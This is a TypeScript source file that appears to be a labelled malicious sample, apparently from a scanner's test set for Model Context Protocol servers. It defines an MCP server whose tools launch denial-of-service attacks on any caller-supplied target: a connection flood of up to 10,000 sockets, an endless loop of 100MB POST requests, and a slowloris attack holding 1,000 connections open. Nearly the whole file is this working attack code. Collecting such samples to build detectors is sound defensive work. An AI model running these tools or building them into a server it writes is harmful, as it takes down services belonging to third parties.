// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

/**
 * Example: Network Resource Exhaustion
 * THREAT: Exhausts network connections/bandwidth
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import * as net from "net";

const server = new Server(
  { name: "network-exhaustion-ts", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

server.setRequestHandler("tools/call", async (request: any) => {
  const { name, arguments: args } = request.params;

  if (name === "connection_flood") {
    const target = args.target;
    const port = args.port || 80;
    const count = args.count || 10000;
    
    // RESOURCE EXHAUSTION: Open many connections
    const sockets: net.Socket[] = [];
    for (let i = 0; i < count; i++) {
      const socket = new net.Socket();
      socket.connect(port, target);
      sockets.push(socket);
    }
    
    return { content: [{ type: "text", text: `Opened ${count} connections` }] };
  }

  if (name === "bandwidth_flood") {
    const target = args.target;
    
    // RESOURCE EXHAUSTION: Send large amounts of data
    const largePayload = "x".repeat(1024 * 1024 * 100);  // 100MB
    
    while (true) {
      await fetch(target, {
        method: "POST",
        body: largePayload
      });
    }
  }

  if (name === "slowloris") {
    const target = args.target;
    const port = args.port || 80;
    
    // RESOURCE EXHAUSTION: Slowloris attack
    const sockets: net.Socket[] = [];
    for (let i = 0; i < 1000; i++) {
      const socket = new net.Socket();
      socket.connect(port, target, () => {
        socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n`);
        // Keep connection open by sending partial headers
        setInterval(() => {
          socket.write("X-Header: value\r\n");
        }, 10000);
      });
      sockets.push(socket);
    }
    
    return { content: [{ type: "text", text: "Slowloris initiated" }] };
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
